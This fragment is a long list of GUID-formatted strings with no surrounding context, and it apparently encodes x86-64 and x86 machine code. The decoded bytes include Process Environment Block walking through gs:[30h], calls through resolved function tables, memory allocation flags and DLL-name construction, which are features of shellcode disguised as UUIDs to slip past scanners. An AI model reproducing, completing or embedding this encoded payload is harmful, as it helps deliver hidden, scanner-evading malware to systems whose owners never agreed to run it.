        "c933d233-53ff-4870-8d4d-10ff93300100",
        "44894800-5824-8b48-f848-85c00f848801",
        "8d480000-1045-8944-7c24-284c8d860c03",
        "89480000-2444-4520-8bcc-33d233c9ff53",
        "4d8d4870-ff10-3093-0100-004c8be84885",
        "41840fc0-0001-4900-8b4e-28498d46304c",
        "8948c08b-9045-8b48-d74c-8b0941ff9188",
        "85000000-0fc0-1488-0100-0033ff4c8d86",
        "0000040c-3841-0f38-84ab-000000488d45",
        "7c894410-2824-8b45-cc48-8944242033d2",
        "53ffc933-4870-548d-2440-488d4d10ff93",
        "000000f8-8b44-2444-408d-4f0c33d24c8b",
        "0893fff8-0001-4800-8bf8-4885c0746983",
        "000278a5-0000-7c83-2440-00765b33c98d",
        "8d440871-0161-8b49-0ccf-ff9330010000",
        "c0458d4c-8966-c075-488d-957802000048",
        "48c84589-cf8b-93ff-1001-0000448bf085",
        "480b79c0-cf8b-93ff-1801-000033ff8b8d",
        "00000278-0341-89cc-8d78-0200003b4c24",
        "45b37240-f685-5278-488b-4d90488d55f0",
        "24548948-0f30-c057-488d-55a00f2945a0",
        "45100ff2-4588-c933-488b-0941b8180100",
        "7c894800-2824-8948-5424-20498bd5f20f",
        "48b04511-018b-90ff-c801-00004885ff74",
        "cf8b4809-93ff-0118-0000-488b7c245849",
        "93ffcd8b-0138-0000-488b-cfff93380100",
        "01bf4100-0000-4100-8bc7-488b9c246003",
        "81480000-20c4-0003-0041-5f415e415d41",
        "5d5e5f5c-ccc3-cccc-4889-542410555356",
        "41544157-4155-4156-5748-8dac2438fdff",
        "ec8148ff-03c8-0000-4c8d-ba2805000033",
        "77634dff-483c-f18b-4d03-f748897c2460",
        "894cc933-8875-8b4c-ea48-89bd28030000",
        "247c8948-4c50-7d89-80ff-5640488bc848",
        "0f3c4063-4cb7-0408-6641-394e040f850f",
        "41000009-468b-4850-8945-98418b86b400",
        "85890000-0320-0000-85c0-750b498b4630",
        "28858948-0003-b900-0300-000048897c24",
        "9e8d4830-0625-0000-8d41-fe448d61ff40",
        "34753b38-44c7-2824-0000-00084c8d4d98",
        "c7c03345-2444-4020-0000-00ba1f000f00",
        "244c8d48-ff68-1096-0200-0085c00f859f",
        "e9000008-009b-0000-897c-24284533c989",
        "4420244c-c08b-8b48-cbba-00000080ff96",
        "00000090-8b48-48f8-ffc8-4883f8fd0f87",
        "0000086e-db33-8d48-5424-58488bcf4889",
        "ff58245c-9896-0000-0085-c00f84510800",
        "24448b00-4158-4639-500f-874308000048",
        "30247c89-8d48-244c-68c7-442428000000",
        "c9334501-3345-44c0-8964-2420ba1f000f",
        "1096ff00-0002-4800-8bcf-8bd8ff96f000",
        "ff330000-db85-850f-0608-0000488d9e25",
        "ff000006-b096-0000-0048-8b4c24684c8d",
        "00032885-c700-2444-4804-000000488bd0",
        "40247c89-8d48-2444-5044-896424384533",
        "448948c9-3024-8948-7c24-2848897c2420",
        "021896ff-0000-8b48-8d28-0300004d6367",
        "e1034c3c-894c-2464-7885-c0740b3d0300",
        "850f4000-079a-0000-4885-c90f84910700",
        "3b384000-6574-8b48-5424-504c8d8d1003",
        "04bf0000-0000-4400-8bc7-ff5660498d5e",
        "cf8b4454-138b-c933-41b8-003000004889",
        "ff70245c-4856-8b44-0348-8bc8488b9528",
        "48000003-4489-5824-e8e7-150000448b44",
        "d2335024-8b48-288d-0300-00e8f4150000",
        "288d8b48-0003-3300-ffeb-15488b851803",
        "8d490000-545e-8948-5c24-704889442458",
        "49038b44-d78b-a9e8-1500-00488b852803",
        "8b440000-49ff-4489-2430-410fb7442414",
        "18c08348-0349-48c4-8945-9066413b7c24",
        "4c527306-758b-4c80-8be8-418bc7488d3c",
        "5c8b4180-0cfd-0348-9d28-030000418b54",
        "8b4814fd-45cb-448b-fd10-4903d6e85215",
        "b60f0000-4103-c7ff-4189-44fd08410fb7",
        "44062444-f83b-c272-4c8b-758833ff4c8b",
        "000318ad-4c00-858b-2803-00008b852003",
        "8b4d0000-4dd0-562b-3085-c00f84f20000",
        "d2854d00-840f-00e9-0000-418b8c24b000",
        "8d480000-011c-8d4a-0403-4e8d0c014c3b",
        "cc830fc8-0000-4100-bfff-0f0000413979",
        "bc840f04-0000-4100-8b41-044d8d590849",
        "3b4cc103-0fd8-9884-0000-00b902000000",
        "13b70f41-c28b-2341-c741-0301413b4424",
        "416d7350-098b-c28b-4923-c766c1ea0c49",
        "0348c003-66c8-fa83-0a75-054c0111eb36",
        "000003b8-6600-d03b-7505-418bc2eb24b8",
        "00000001-3b66-75d0-0c49-8bc248c1e810",
        "ebc0b70f-b80e-0002-0000-663bd0751541",
        "48c2b70f-0101-8b4c-8528-030000b90200",
        "0ceb0000-8566-0fd2-8538-050000488bc8",
        "04418b41-034c-49d9-03c1-4c3bd80f856d",
        "4affffff-048d-4d03-8bcb-4c3bd80f823a",
        "41ffffff-848b-9024-0000-0085c00f84b6",
        "49000000-1c8d-3900-7b0c-0f84a9000000",
        "18b58b4c-0003-8b00-530c-488bce4903d0",
        "000bdfe8-4c00-858b-2803-00004c8be88b",
        "7b8b443b-4910-f803-4d03-f8488b0f33c0",
        "74c98548-7955-4408-8bc9-4533c0eb2c4e",
        "4101248d-4639-7404-1a49-8d542402488b",
        "f032e8ce-ffff-c085-7409-488b86e00100",
        "4513eb00-c933-8d4d-4424-02498bd5488b",
        "0c66e8ce-0000-8949-0748-83c7084c8b85",
        "00000328-8349-08c7-eba1-4883c31433ff",
        "0f0c7b39-6e85-ffff-ff4c-8b75884c8bad",
        "00000318-8b4c-2464-7841-8b8424f00000",
        "0fc08500-8684-0000-0048-8d78044903f8",
        "c085078b-7774-d08b-488b-ce4903d0e821",
        "4c00000b-858b-0328-0000-4c8be033c04d",
        "4a74e485-5f8b-440c-8b7f-084903d84d03",
        "7933ebf8-4408-0b8b-4c8b-c0eb0a4983c0",
        "c88b4402-034c-49c1-8bd4-488bcee8ca0b",
        "89490000-4807-c383-084c-8b8528030000",
        "08c78349-c033-8b48-0b48-85c975c54883",
        "078b20c7-c085-8e75-4c8b-64247833ff45",
        "2824648b-8d48-a04d-b802-0000004d03e0",
        "8065894c-508d-417e-0f10-06410f104e10",
        "4101110f-100f-2046-0f11-4910410f104e",
        "41110f30-4120-100f-4640-0f114930410f",
        "0f504e10-4111-4140-0f10-46600f114950",
        "4e100f41-4c70-f203-0f11-41604803ca0f",
        "48f04911-e883-7501-ae49-8b0641b80030",
        "89480000-3301-48c9-8b45-a048c1e83044",
        "4804498d-148d-4880-c1e2-03ff5648440f",
        "48a67db7-c88b-8b48-5590-488bd8488944",
        "8d476024-bf04-c141-e003-e815120000b8",
        "00000001-8639-0574-0000-75584038be25",
        "75000006-4829-5c8b-2470-33d2488b8d28",
        "44000003-038b-09e8-1200-00448b03498d",
        "0005288d-3300-e8d2-f811-0000eb21488b",
        "48582444-c085-1c74-488b-5c2470488bd0",
        "288d8b48-0003-4400-8b03-e8b511000048",
        "60245c8b-3840-25be-0600-000f858a0000",
        "b096ff00-0000-4800-8b95-28030000488b",
        "2096ffc8-0002-8500-c00f-85e302000048",
        "0328858b-0000-bd39-2003-000048897c24",
        "450f4850-48c7-8589-2803-0000ff96b000",
        "8b480000-244c-4c68-8d85-28030000c744",
        "00804824-0000-8b48-d089-7c2440b80200",
        "44890000-3824-3345-c948-8d4424504889",
        "48302444-7c89-2824-4889-7c2420ff9618",
        "85000002-0fc0-7785-0200-00488b542450",
        "108d8d4c-0003-4800-8b8d-2803000041b8",
        "00000008-56ff-4460-8bf7-4585ff0f84eb",
        "4c000000-6c8b-6024-488d-7b0c8b9d1803",
        "33450000-45e4-548d-2401-8b5718448bc2",
        "c141ca8b-1ee8-eac1-1d41-23d2c1e91f85",
        "9a850fd1-0000-4100-85d0-7407bb200000",
        "4446eb00-ca8b-c18b-4533-ca4123c04185",
        "8a1274c1-2586-0006-00f6-d81bdb83e3fc",
        "eb08c383-4124-ca33-418b-c04133c223c1",
        "0774c285-10bb-0000-00eb-0e4123c8b802",
        "41000000-c985-450f-d844-8b07418d47ff",
        "28958b4c-0003-4d00-03d0-443bf0731241",
        "4801468d-048d-4180-8b54-c50c492bd0eb",
        "04578b03-8d4c-108d-0300-004489a51003",
        "8b440000-49c3-ca8b-ff56-6041ba010000",
        "f2034500-8348-28c7-453b-f70f8239ffff",
        "658b4cff-3380-4cff-8bad-180300008b55",
        "8d8d4ccc-0310-0000-488b-8d2803000041",
        "000002b8-8900-10bd-0300-00ff5660488b",
        "4178244c-01be-0000-008b-81d000000048",
        "03288d8b-0000-c085-7427-488b5c081848",
        "1d74db85-13eb-3345-c041-8bd6ffd0488b",
        "0003288d-4800-5b8d-0848-8b034885c075",
        "0003b8e5-0000-3941-4500-0f8572010000",
        "45c8458b-c033-0348-c141-8bd6ffd04138",
        "00030cbd-0f00-ca84-0100-008b45284c8b",
        "00032885-4900-0c8d-0085-c00f84cf0100",
        "18598b00-db85-840f-c401-00008b791c44",
        "4920798b-f803-8b44-7124-4d03f84d03f0",
        "41ff438d-0c8b-4987-8d95-0c0300004903",
        "e08b44c8-d88b-65e8-0f00-004c8b852803",
        "c0850000-840f-008c-0000-85db75d24c8b",
        "000318ad-4d00-c085-7453-0fb745a6bf00",
        "480000c0-4c8b-6024-448b-c7488d148048",
        "ff03e2c1-5056-8b48-4424-584885c0740c",
        "44f4558b-c78b-8b48-c8ff-5650ff96b000",
        "8b480000-2895-0003-0048-8bc8ff962002",
        "8b480000-244c-ff68-96f0-000000458b85",
        "00000524-8d49-288d-0500-0033d2e8c20e",
        "81480000-c8c4-0003-0041-5f415e415d41",
        "5b5e5f5c-c35d-0f43-b704-668b1c874903",
        "67840fd8-ffff-4cff-8bad-180300004533",
        "bd8d49f6-040c-0000-4438-3774414539b5",
        "0000050c-2274-8d48-85b0-000000c74424",
        "00010028-4100-c983-ff48-894424204c8b",
        "33d233c7-ffc9-7056-4539-b50c05000048",
        "00b08d8d-0000-0f48-44cf-ffd3eb6effd3",
        "8d4d6aeb-0c85-0004-0041-3838742e488d",
        "0000b085-c700-2444-2800-0100004183c9",
        "448948ff-2024-d233-33c9-ff5670488d95",
        "000000b0-8b48-e8ce-7c03-000041397d04",
        "89483c74-247c-4528-33c9-4d8bc4897c24",
        "33d23320-ffc9-8896-0000-004885c0740c",
        "48ffca83-c88b-96ff-8000-00004c8b8528",
        "eb000003-4c22-ad8b-1803-0000ebee6548",
        "30250c8b-0000-4800-8b49-6041ffd4ebdc",
        "18ad8b4c-0003-b800-0300-000039863002",
        "850f0000-fe6d-ffff-83c9-ffff56684c8b",
        "00032885-e900-fe5b-ffff-cccc48895c24",
        "74894810-2024-5755-4156-488dac24c0fc",
        "8148ffff-40ec-0004-0048-8bda488bf148",
        "0d58918b-0000-b841-0030-000033c9488d",
        "00025514-0000-8d44-4904-ff56484c8bf0",
        "0fc08548-9484-0002-008b-8b240500004c",
        "0528838d-0000-c903-83cb-ff894c242844",
        "c933cb8b-8948-2444-2033-d2ff56708365",
        "8d4800e8-8045-6583-f800-488d55084889",
        "8b48e045-48ce-058d-74db-ffff48897538",
        "80458948-8d48-f905-d9ff-ff4889458848",
        "da56058d-ffff-8948-4590-488d05d3daff",
        "458948ff-4898-058d-50da-ffff488945a0",
        "41058d48-ffda-48ff-8945-a8488d0536da",
        "8948ffff-b045-8d48-052b-daffff488945",
        "058d48b8-dab8-ffff-4889-45c0488d0515",
        "48ffffda-4589-48c8-8d05-0adaffff4889",
        "8d48d045-2444-4850-8945-f0488d0592d9",
        "8948ffff-2444-4850-8d05-76d9ffff4889",
        "48582444-058d-d9d2-ffff-488944246048",
        "d966058d-ffff-8948-4424-68488d055ad9",
        "8948ffff-2444-4870-8d45-404889450848",
        "e8007589-e590-ffff-33d2-33c9ff96a801",
        "c0850000-850f-014c-0000-488d85600300",
        "4cd23300-8e8d-08d0-0000-488944242048",
        "08b08e8d-0000-8d44-4304-ff96b0010000",
        "850fc085-011e-0000-488b-8d6003000048",
        "0910968d-0000-8d4c-8570-030000488b01",
        "c08510ff-850f-00e2-0000-488b8d700300",
        "018b4800-50ff-8518-c00f-85c000000048",
        "03608d8b-0000-8d48-55e0-48894d20488b",
        "1850ff01-c085-850f-a300-0000488d8530",
        "c7000001-2444-0028-0100-004c8d861106",
        "89480000-2444-4420-8bcb-33d233c9ff56",
        "8d8d4870-0130-0000-ff96-30010000488b",
        "0003608d-4400-438d-0348-8bd0488bf84c",
        "ff41098b-4051-8b48-cf8b-d8ff96380100",
        "75db8500-484a-6483-2448-004533c94883",
        "00402464-3345-21c0-5c24-38498bd6488b",
        "0003708d-2100-245c-3048-836424280048",
        "20246483-4800-018b-ff50-2885c0751048",
        "03608d8b-0000-538d-0248-8b01ff502848",
        "03708d8b-0000-8b48-01ff-5010488b8d60",
        "48000003-018b-50ff-3848-8b8d60030000",
        "ff018b48-1050-8b44-8658-0d000033d249",
        "8d46ce8b-4504-0002-0000-e8b50a000033",
        "00b841d2-00c0-4900-8bce-ff56504c8d9c",
        "00044024-4900-5b8b-2849-8b7338498be3",
        "5d5f5e41-ccc3-cccc-4889-5c241048896c",
        "89481824-2474-5720-4154-415541564157",
        "b0ec8148-0000-6500-488b-042530000000",
        "48f18b48-c181-0348-0000-488bea4c8b78",
        "4056ff60-c933-634c-483c-4c03c8450fb7",
        "0f451451-41b7-4d06-03d1-4585c0741944",
        "03408e8b-0000-8d48-1489-45394cd21874",
        "41c1ff3c-c83b-ee72-8b9c-24e000000048",
        "e024bc8b-0000-ff00-96c0-00000033d285",
        "4c3a74db-c78b-8d49-4808-4d8bf04c8bc1",
        "74013948-ff1a-3bc2-d372-ebeb28418b7c",
        "8b4124d2-d25c-4820-03f8-c1eb03ebc848",
        "8b49d58b-ffce-f096-0100-00eb084c8bb4",
        "0000e024-ff00-b896-0000-0033ed448d4d",
        "74db8501-4841-4f8d-0848-3901740d4103",
        "c18348e9-3b08-72eb-f0eb-2b458ac1488d",
        "4920244c-d68b-96ff-d001-0000488d0cef",
        "0010b841-0000-8d48-5424-20e854090000",
        "0001b941-0000-8b49-4718-488b7810e902",
        "4c000001-a68d-0370-0000-418a0c2433ed",
        "8b45d233-84f9-0fc9-84e5-0000004533c0",
        "743bf980-812e-80fa-0000-00732633c042",
        "30044c88-f980-4177-0f45-c780f970448b",
        "440f41f8-41e9-d103-448b-c2428a0c2284",
        "85cd75c9-0fd2-a784-0000-008d4a01c644",
        "48003014-578b-4c30-8d44-24304c03e145",
        "8b48c933-e8ce-01a2-0000-488bd841b901",
        "48000000-c085-8274-4585-ff743885ed74",
        "48d3ff14-d88b-b941-0100-00004885c00f",
        "ffff6584-48ff-138b-488b-cee8a4e5ffff",
        "0001b941-0000-c085-0f84-4cffffff488b",
        "eb282444-8535-74ed-14ff-d3488bd841b9",
        "00000001-8548-0fc0-842d-ffffff488b13",
        "e8ce8b48-e56c-ffff-41b9-0100000085c0",
        "ff14840f-ffff-8b49-4608-488903e908ff",
        "8b48ffff-483f-7f83-3000-0f85f3feffff",
        "249c8d4c-00b0-0000-418b-c1498b5b3849",
        "49406b8b-738b-4948-8be3-415f415e415d",
        "c35f5c41-8948-245c-0848-897424105748",
        "4160ec83-ca83-45ff-33c0-488bf1443802",
        "83411974-40f8-1373-418a-041042884404",
        "c0ff4120-8041-103c-0075-e7418d40fc42",
        "200444c6-8000-047c-202e-742a42c64404",
        "ff412e20-42c0-44c6-0420-6441ffc042c6",
        "6c200444-ff41-41c0-8d40-0142c6440420",
        "0444c66c-0020-4865-8b04-253000000048",
        "4860488b-418b-4818-8b78-10488b5f3048",
        "3974db85-6348-3c43-8b8c-188800000033",
        "74c985c0-8b1b-1954-0c48-8d4c24204803",
        "07bae8d3-0000-8b44-d033-c04585d27425",
        "453f8b48-d285-c375-4885-c07508488d4c",
        "56ff2024-4830-5c8b-2470-488b74247848",
        "5f60c483-48c3-c38b-ebeb-cccc48895c24",
        "44894c20-1824-8948-4c24-085556574154",
        "56415541-5741-8148-eca0-0000004533db",
        "4cfa8b48-d18b-8b41-db48-85d20f845201",
        "634c0000-3c7a-8b41-8417-8800000085c0",
        "013e840f-0000-8d48-3402-448b761c448b",
        "034c206e-44f2-668b-244c-03ea4c03e24d",
        "840fc085-010c-0000-8b6e-1885ed0f8411",
        "8d000001-ff45-8b49-d041-8b4c85008be8",
        "48cf0348-8489-e824-0000-00e8d0060000",
        "85db3345-75c0-4814-8b84-24e800000041",
        "4404b70f-8b41-861c-4803-df85ed740d4c",
        "f024848b-0000-4800-85db-74b74c8b9424",
        "000000e0-3b48-0fde-82a2-000000418b84",
        "00008c3f-4800-c603-483b-d80f838e0000",
        "c38b4500-3844-741b-1e41-83f83c731841",
        "0c8ac08b-8818-044c-2080-f92e740941ff",
        "1c3845c0-7518-41e2-8d40-018bd0c64404",
        "8d416420-0240-44c6-0420-6c418d4003c6",
        "6c200444-8d41-0440-4c8d-041a44885c04",
        "d38b4120-3845-7418-1783-fa3f73128bca",
        "8a42c2ff-0104-4488-0c60-46381c0275e9",
        "8d4cc28b-244c-4c60-8d44-2420488bd749",
        "8844ca8b-045c-e860-fcdc-ffff488bd848",
        "12ebc38b-2b44-104e-438b-1c8e4803dfe9",
        "ffffff40-c033-8b48-9c24-f80000004881",
        "0000a0c4-4100-415f-5e41-5d415c5f5e5d",
        "ccccccc3-8948-245c-0848-896c24104889",
        "57182474-8348-20ec-6548-8b0425300000",
        "f88b4900-8b48-48f2-8be9-4533d24c8b48",
        "418b4960-4818-588b-10eb-1c4d85d27520",
        "4ccf8b4c-c68b-8b48-d048-8bcde8bfdaff",
        "1b8b48ff-8b4c-48d0-8b43-304885c075db",
        "245c8b48-4930-c28b-488b-6c2438488b74",
        "83484024-20c4-c35f-4889-5c241048896c",
        "89481824-2474-5720-4156-41574883ec30",
        "ed33f633-3345-48f6-8bfa-4c8bf9428a4c",
        "c984003d-1474-fd83-4074-0f884c3420ff",
        "83c6ffc5-10fe-6775-eb53-8bc6488d5c24",
        "d8034820-b841-0010-0000-488bcb442bc6",
        "cde8d233-0004-c600-0380-83fe0c722048",
        "8d48d78b-244c-e820-5800-000033d2488d",
        "4820244c-f833-8d44-4210-e8a50400008d",
        "0000ed04-0000-ff41-c689-44242c488bd7",
        "244c8d48-e820-002a-0000-4833f833f645",
        "840ff685-ff75-ffff-488b-5c2458488bc7",
        "246c8b48-4860-748b-2468-4883c430415f",
        "c35f5e41-5340-8348-ec10-0f1001488954",
        "ca8b2824-8b44-2444-2c45-33d20f110424",
        "0c24548b-8b44-245c-088b-5c2404448b0c",
        "c1c28b24-08c9-0341-c88b-d34133c9c1ca",
        "d1034108-c141-03c0-4133-d241c1c10344",
        "3344ca33-41c1-c2ff-418b-db448bd84183",
        "cd721bfa-4c89-2824-4489-44242c488b44",
        "83482824-10c4-c35b-4585-c90f84450100",
        "5c894800-0824-8948-7424-1048897c2418",
        "41544155-4856-ec8b-4883-ec104c8bd948",
        "4cf0458d-d82b-8d4c-720f-498bf841bc10",
        "48000000-458d-49f0-3bc6-7713488d45ff",
        "72c23b48-0f0a-0210-f30f-7f45f0eb080f",
        "0ff30210-457f-48f0-8d4d-f041b8040000",
        "048b4100-310b-4801-8d49-044983e80175",
        "458b44f0-49fc-dc8b-8b45-f8448b55f48b",
        "0341f04d-41ca-c003-41c1-c2054433d141",
        "4408c0c1-c033-c1c1-1041-03c24103c841",
        "4107c2c1-c0c1-440d-33d0-4433c1c1c010",
        "01eb8348-cc75-8944-45fc-448d4304894d",
        "4d8d48f0-44f0-5589-f489-45f8428b0419",
        "8d480131-0449-8349-e801-75f0453bcc41",
        "0f41c98b-cc47-8b44-d185-c9741d488d5d",
        "c78b4cf0-2b48-41df-8bf2-428a04034130",
        "c0ff4900-8348-01ee-75f0-442bc9458bc4",
        "41fa0349-408d-80ff-0410-01750841ffc8",
        "7fc08545-45ee-c985-0f85-05ffffff488b",
        "4830245c-748b-3824-488b-7c24404883c4",
        "415e4110-5d5c-ccc3-488b-c44889580848",
        "48107089-7889-4c18-8970-2055488bec48",
        "8a40ec83-4101-ce83-ff83-65f4004533c9",
        "ff330288-8d48-0142-488b-da488945e845",
        "8d48de8b-0141-8948-45e0-8d7701488d4d",
        "01f6e8e0-0000-c085-0f84-aa010000488d",
        "e5e8e04d-0001-8500-c00f-849f00000048",
        "e8e04d8d-01d4-0000-85c0-744e4533c945",
        "4804518d-4d8d-e8e0-c001-0000468d0c48",
        "75d62b44-45ee-c985-741d-488b55e8488b",
        "c98b41c2-2b48-8ac1-0088-024803d64889",
        "6be9e855-0001-4800-8b45-e8c600004803",
        "458948c6-e9e8-0158-0000-488b45e0440f",
        "034818b6-41c6-cb8b-4889-45e023ce83c1",
        "ebd14102-2174-8b48-55e8-458bc349f7d8",
        "10048a41-0288-0348-d641-03ce75f24889",
        "fce9e855-0000-8b00-fee9-f5000000448b",
        "4d8d48d6-e8e0-0132-0000-488d4de0468d",
        "25e85014-0001-8500-c075-e64585c97548",
        "02fa8341-4275-8b44-ce48-8d4de0e80a01",
        "8d480000-e04d-8d46-0c48-e8fd00000085",
        "45e675c0-c985-840f-a700-0000488b4de8",
        "48d38b41-daf7-048a-0a88-014803ce4503",
        "e9f375ce-0087-0000-488b-4de04433ce45",
        "8b44d12b-41ce-e2c1-0844-0fb6194181c3",
        "fffffe00-0345-48da-03ce-48894de0488d",
        "a5e8e04d-0000-4800-8d4d-e0468d0c48e8",
        "00000098-c085-e675-4181-fb007d000041",
        "4101418d-420f-41c1-81fb-000500008d48",
        "c8420f01-8141-80fb-0000-00448d410244",
        "45c1430f-c085-1b74-488b-4de8418bd348",
        "048adaf7-880a-4801-03ce-4503c675f348",
        "44e84d89-ce8b-1deb-488b-55e0488b4de8",
        "0188028a-0348-48ce-03d6-48894de84889",
        "3345e055-85c9-0fff-8420-feffff8b45e8",
        "24748b48-2b58-48c3-8b5c-2450488b7c24",
        "748b4c60-6824-8348-c440-5dc38b51144c",
        "8d10418d-ff42-4189-1485-d27517488b11",
        "4102b60f-0089-8d48-4201-488901c74114",
        "00000007-8b41-8d00-0c00-c1e80783e001",
        "c3088941-8b4c-45c9-85c0-7413482bd142",
        "410a048a-0188-ff49-c141-83c0ff75f048",
        "ccc3c18b-8948-247c-084c-8bc98ac2498b",
        "c88b41f9-aaf3-8b48-7c24-08498bc1c3cc",
        "3a800feb-7400-3a10-0275-0c48ffc148ff",
        "84018ac2-75c0-0feb-be01-0fbe0a2bc1c3",
        "8a4419eb-4502-c084-7417-4180c8200c20",
        "75c03a41-480c-c1ff-48ff-c28a0184c075",
        "01be0fe1-be0f-2b0a-c1c3-5a515281ecd4",
        "53000002-5655-b48b-24e4-02000033db57",
        "9e39fb8b-0238-0000-0f84-ea000000ff76",
        "2876ff2c-b6ff-008c-0000-ffb688000000",
        "2845e856-0000-f88b-83c4-1485ff0f84c0",
        "53000000-5653-2de8-2600-008bc8b8d722",
        "7b2d0040-4036-0300-c851-5353ffd7ff76",
        "fff88b2c-2876-b6ff-0c02-0000ffb60802",
        "e8560000-2803-0000-ff76-2c89442428ff",
        "b6ff2876-00a4-0000-ffb6-a000000056e8",
        "000027e7-76ff-8b2c-d8ff-7628ffb6ac00",
        "b6ff0000-00a8-0000-56e8-cd27000083c4",
        "6ae88b3c-ff00-3856-837c-241000894424",
        "854c7414-74db-8548-ed74-448d442418c7",
        "07182444-0100-5000-ffd5-50ffd38b8638",
        "03000002-2444-8314-a424-dc000000fc89",
        "00d02484-0000-448d-2418-6a0050ff5424",
        "830ceb18-ffc8-09eb-56e8-c6110000598b",
        "5d5e5fc7-815b-d4c4-0200-00c38b442404",
        "f004c083-00ff-008b-c204-00b801400080",
        "560008c2-e857-253e-0000-8b742410b9ad",
        "bf004011-367b-0040-2bcf-03c18b0e8901",
        "002523e8-b900-111f-4000-2bcf03c18b0e",
        "e8044189-2510-0000-b90c-1240002bcf03",
        "890e8bc1-0841-fde8-2400-00b92e114000",
        "c103cf2b-0e8b-4189-0ce8-ea240000b92e",
        "2b004011-03cf-8bc1-0e5f-8941108b4424",
        "04668308-8900-0846-5ec3-8b4c240c85c9",
        "03b80775-0040-eb80-4d53-8b5c240c33d2",
        "24748b56-570c-7e8b-088b-849730080000",
        "7593043b-4208-fa83-0475-eeeb1433d28b",
        "08f09784-0000-043b-9375-104283fa0475",
        "f03189ee-46ff-3304-c0eb-08832100b802",
        "5f800040-5b5e-0cc2-008b-4c240483c8ff",
        "41c10ff0-4804-04c2-0033-c0c20800558b",
        "1045f6ec-5602-758b-0857-74158b7d1885",
        "8b1b74ff-1c46-8b50-08ff-51048b461c89",
        "1045f607-7401-8b19-7d14-85ff7507b803",
        "eb800040-830d-14c6-568b-06ff50048937",
        "5e5fc033-c25d-0014-8b44-24048b402cff",
        "4c8b5450-0824-0189-33c0-c208005657e8",
        "000023f4-748b-1024-b9be-134000bf7b36",
        "cf2b0040-c103-0e8b-8901-e8d9230000b9",
        "0040111f-cf2b-c103-8b0e-894104e8c623",
        "0cb90000-4012-2b00-cf03-c18b0e894108",
        "0023b3e8-b900-126b-4000-2bcf03c18b0e",
        "e80c4189-23a0-0000-b921-1240002bcf03",
        "890e8bc1-1041-8de8-2300-00b91c124000",
        "c103cf2b-0e8b-4189-14e8-7a230000b9b9",
        "2b004013-03cf-8bc1-0e89-4118e8672300",
        "121cb900-0040-cf2b-03c1-8b0e89411ce8",
        "00002354-6eb9-4013-002b-cf03c18b0e89",
        "41e82041-0023-b900-6913-40002bcf03c1",
        "41890e8b-e824-232e-0000-b9691340002b",
        "8bc103cf-5f0e-4189-288b-442408836604",
        "2c468900-c35e-c033-c204-00558bec83ec",
        "56c0332c-206a-8950-45f4-8945f88945fc",
        "50d4458d-8be8-0029-008b-750c8d4dd483",
        "068b0cc4-5651-50ff-0c85-c075128b068d",
        "8d51fc4d-f84d-8d51-4df4-5156ff501033",
        "c2c95ec0-0008-c033-c20c-008b4c240c85",
        "b80775c9-4003-8000-eb6c-8b542404538b",
        "560c245c-8b57-2c7a-33f6-8b84b7300800",
        "b3043b00-0875-8346-fe04-75eeeb1433f6",
        "e0b7848b-0008-3b00-04b3-750e4683fe04",
        "1189ee75-fff0-0442-eb1d-33f68b84b7f0",
        "3b000008-b304-1375-4683-fe0475ee8d42",
        "f0018908-42ff-330c-c0eb-08832100b802",
        "5f800040-5b5e-0cc2-008b-442418832000",
        "18c2c033-8b00-2444-040f-af442408c38b",
        "83142444-0020-c033-c214-008b44240403",
        "c3082444-5351-8b56-7424-108d86540300",
        "e8565000-220a-0000-8bd8-595985db7506",
        "00d5e940-0000-5755-6a00-8d86c8050000",
        "e8565350-2288-0000-8be8-83c41085ed0f",
        "0000b284-bf00-1448-4000-81ef3c144000",
        "00a1880f-0000-448d-2418-506a405755ff",
        "c0854856-840f-008d-0000-57e8a8210000",
        "40143cb9-8100-7be9-3640-0003c15055e8",
        "0000280c-c483-8d0c-4424-1050ff74241c",
        "56ff5557-6a48-8d00-86d8-050000505356",
        "00221be8-8b00-83e8-c410-85ed7449bf5e",
        "bb004014-1452-0040-2bfb-783b8d442418",
        "57406a50-ff55-4856-85c0-742b57e84621",
        "eb810000-367b-0040-03c3-5055e8af2700",
        "0cc48300-448d-1024-50ff-74241c5755ff",
        "c0334856-eb40-3302-c05f-5d5e5b59c355",
        "5651ec8b-758b-5708-8d86-680300005056",
        "00210de8-6a00-8d00-8ee8-050000515056",
        "00219be8-8b00-83f8-c418-85ff74348d45",
        "406a5008-046a-ff57-5648-85c074246a04",
        "060d868d-0000-5750-e843-27000083c40c",
        "50fc458d-75ff-6a08-0457-ff564833c040",
        "c03302eb-5e5f-c3c9-81ec-ec0200005355",
        "24b48b56-02fc-0000-8d44-2434576a3c33",
        "21db33ed-245c-bf24-0003-60045550e821",
        "83000027-0cc4-44c7-2438-3c0000008d84",
        "0001f824-b900-0104-0000-894424488d84",
        "0000f424-8900-2444-648d-442474894424",
        "24848d54-00b4-0000-6a40-894424608d44",
        "4c893c24-5024-4c89-246c-595068000000",
        "868d5510-0924-0000-894c-246450894c24",
        "bc96ff70-0000-8500-c00f-841403000033",
        "247c83c0-0444-940f-c089-442418b80033",
        "440f04e0-33f8-50c0-5050-5050897c243c",
        "00c096ff-0000-4489-2434-85c00f84e102",
        "c9330000-5151-036a-5151-ff7424648d8c",
        "00021024-5100-ff50-96c4-000000894424",
        "0fc08530-5a84-0002-0033-d2395c246875",
        "84c7660a-f424-0000-002f-005257525252",
        "08248c8d-0001-5100-5250-ff96d8000000",
        "ff85f88b-840f-021f-0000-395c24187422",
        "282444f7-1000-0000-7418-6a048d442430",
        "302444c7-3380-0000-506a-1f57ff96c800",
        "5c390000-5824-1374-ff74-2458ff742458",
        "ff571c6a-c896-0000-008b-e8395c246074",
        "2474ff13-ff60-2474-606a-1d57ff96c800",
        "e88b0000-c033-5050-5050-57ff96dc0000",
        "0fc08500-a984-0001-006a-008d442420c7",
        "04202444-0000-5000-8d44-242850681300",
        "ff572000-e096-0000-0085-c00f84810100",
        "247c8100-c820-0000-000f-857301000021",
        "8d10245c-2444-6a1c-0050-8d442418c744",
        "00042424-0000-6850-0500-002057ff96e0",
        "85000000-0fc0-ae85-0000-00ff968c0000",
        "2f763d00-0000-850f-3601-000033c05050",
        "18244489-448d-1c24-5057-ff96d4000000",
        "840fc085-011a-0000-8b4c-241485c97465",
        "0084968b-0000-db85-750b-516a01ffd250",
        "eb7c56ff-8b13-2444-1003-c150536a01ff",
        "96ff50d2-0080-0000-8bd8-85db0f84e000",
        "448d0000-2424-ff50-7424-188b44241803",
        "ff5750c3-cc96-0000-008b-442414014424",
        "24448d10-6a14-6a00-0050-57ff96d40000",
        "75c08500-8d93-8486-0000-008944241885",
        "9b840fdb-0000-eb00-4439-5c24100f848f",
